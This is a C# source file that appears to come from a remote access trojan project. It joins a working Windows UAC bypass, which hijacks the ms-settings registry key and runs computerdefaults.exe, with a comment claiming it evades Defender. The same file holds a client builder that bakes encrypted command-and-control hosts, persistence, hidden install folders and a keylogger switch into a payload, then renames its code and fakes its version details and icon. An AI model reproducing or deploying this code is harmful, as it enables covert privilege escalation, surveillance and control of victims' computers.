﻿using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Management;
using System.Security.Principal;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Vestris.ResourceLib;
using xServer.Core.Cryptography;
using xServer.Core.Data;
using xServer.Core.Helper;
using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Management;
using System.Security.Principal;

namespace xServer.Core.Build
{
    #region uac_bypass
    public class Bypass
    {
        public static void UAC()
        {
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Bypass.Z("Classes");
                Bypass.Z("Classes\\ms-settings");
                Bypass.Z("Classes\\ms-settings\\shell");
                Bypass.Z("Classes\\ms-settings\\shell\\open");
                RegistryKey registryKey = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                registryKey.SetValue("", cpath, RegistryValueKind.String);
                registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                registryKey.Close();
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = "cmd.exe",
                        Arguments = "/c start computerdefaults.exe"
                    });
                }
                catch { }
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                RegistryKey registryKey2 = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }
        }

        public static RegistryKey Z(string x)
        {
            RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
            bool flag = !Bypass.checksubkey(registryKey);
            if (flag)
            {
                registryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }
            return registryKey;
        }

        public static bool checksubkey(RegistryKey k)
        {
            bool flag = k == null;
            return !flag;
        }

        private static ManagementObject GetMngObj(string className)
        {
            ManagementClass managementClass = new ManagementClass(className);
            try
            {
                foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    bool flag = managementObject != null;
                    if (flag)
                    {
                        return managementObject;
                    }
                }
            }
            catch { }
            return null;
        }

        public static string GetOsVer()
        {
            string result;
            try
            {
                ManagementObject mngObj = Bypass.GetMngObj("Win32_OperatingSystem");
                bool flag = mngObj == null;
                if (flag)
                {
                    result = string.Empty;
                }
                else
                {
                    result = (mngObj["Version"] as string);
                }
            }
            catch (Exception ex)
            {
                result = string.Empty;
            }
            return result;
        }
    }
    #endregion

    static class Program
    {
        #region IsAdmin?
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        #endregion

        #region Main
        static void Main()
        {
            try
            {
                if (!IsAdministrator())
                {
                    Bypass.UAC();

                }
                else if (IsAdministrator())
                {
                    //this method seems to bypass defender
                    //5-02-2021 and binary is not flagged
                    string WhatToElevate = "cmd.exe"; // cmd.exe will be elevated as an example and PoC
                    Process.Start("CMD.exe", "/c start " + WhatToElevate);
                    RegistryKey uac_clean = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                    uac_clean.DeleteSubKeyTree("shell"); //deleting this is important because if we won't delete that right click of windows will break.
                    uac_clean.Close();
                }

            }
            catch { Environment.Exit(0); }
        }
        #endregion
    }
    /// <summary>
    /// Provides methods used to create a custom client executable.
    /// </summary>
    public static class ClientBuilder
    {
        /// <summary>
        /// Builds a client executable.
        /// </summary>
        /// <remarks>
        /// Assumes the 'client.bin' file exist.
        /// </remarks>
        public static void Build(BuildOptions options)
        {
            // PHASE 1 - Settings
            string encKey = FileHelper.GetRandomFilename(20), key, authKey;
            CryptographyHelper.DeriveKeys(options.Password, out key, out authKey);
            AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "xClient.Config.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            int strings = 1, bools = 1;

                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
                                {
                                    switch (strings)
                                    {
                                        case 1: //version
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Version, encKey);
                                            break;
                                        case 2: //ip/hostname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.RawHosts, encKey);
                                            break;
                                        case 3: //key
                                            methodDef.Body.Instructions[i].Operand = key;
                                            break;
                                        case 4: //authkey
                                            methodDef.Body.Instructions[i].Operand = authKey;
                                            break;
                                        case 5: //installsub
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallSub, encKey);
                                            break;
                                        case 6: //installname
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.InstallName, encKey);
                                            break;
                                        case 7: //mutex
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Mutex, encKey);
                                            break;
                                        case 8: //startupkey
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.StartupName, encKey);
                                            break;
                                        case 9: //encryption key
                                            methodDef.Body.Instructions[i].Operand = encKey;
                                            break;
                                        case 10: //tag
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.Tag, encKey);
                                            break;
                                        case 11: //LogDirectoryName
                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(options.LogDirectoryName, encKey);
                                            break;
                                    }
                                    strings++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
                                {
                                    switch (bools)
                                    {
                                        case 1: //install
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Install));
                                            break;
                                        case 2: //startup
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Startup));
                                            break;
                                        case 3: //hidefile
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideFile));
                                            break;
                                        case 4: //Keylogger
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.Keylogger));
                                            break;
                                        case 5: //HideLogDirectory
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideLogDirectory));
                                            break;
                                        case 6: // HideInstallSubdirectory
                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideInstallSubdirectory));
                                            break;
                                    }
                                    bools++;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
                                {
                                    //reconnectdelay
                                    methodDef.Body.Instructions[i].Operand = options.Delay;
                                }
                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
                                {
                                    methodDef.Body.Instructions[i].Operand = GetSpecialFolder(options.InstallPath);
                                }
                            }
                        }
                    }
                }
            }

            // PHASE 2 - Renaming
            Renamer r = new Renamer(asmDef);

            if (!r.Perform())
                throw new Exception("renaming failed");

            // PHASE 3 - Saving
            r.AsmDef.Write(options.OutputPath);

            // PHASE 4 - Assembly Information changing
            if (options.AssemblyInformation != null)
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(options.OutputPath);

                versionResource.FileVersion = options.AssemblyInformation[7];
                versionResource.ProductVersion = options.AssemblyInformation[6];
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                stringFileInfo["CompanyName"] = options.AssemblyInformation[2];
                stringFileInfo["FileDescription"] = options.AssemblyInformation[1];
                stringFileInfo["ProductName"] = options.AssemblyInformation[0];
                stringFileInfo["LegalCopyright"] = options.AssemblyInformation[3];
                stringFileInfo["LegalTrademarks"] = options.AssemblyInformation[4];
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = options.AssemblyInformation[5];
                stringFileInfo["OriginalFilename"] = options.AssemblyInformation[5];

                versionResource.SaveTo(options.OutputPath);

            }

            // PHASE 5 - Icon changing
            if (!string.IsNullOrEmpty(options.IconPath))
                IconInjector.InjectIcon(options.OutputPath, options.IconPath);
        }

        /// <summary>
        /// Obtains the OpCode that corresponds to the bool value provided.
        /// </summary>
        /// <param name="p">The value to convert to the OpCode</param>
        /// <returns>Returns the OpCode that represents the value provided.</returns>
        private static OpCode BoolOpcode(bool p)
        {
            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        }

        /// <summary>
        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
        /// </summary>
        /// <param name="installpath">The integer value of the install path.</param>
        /// <returns>Returns the signed-byte value of the special folder.</returns>
        /// <exception cref="System.ArgumentException">Thrown if the path to the special folder was invalid.</exception>
        private static sbyte GetSpecialFolder(int installpath)
        {
            switch (installpath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFilesX86;
                case 3:
                    return (sbyte)Environment.SpecialFolder.SystemX86;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }
    }

}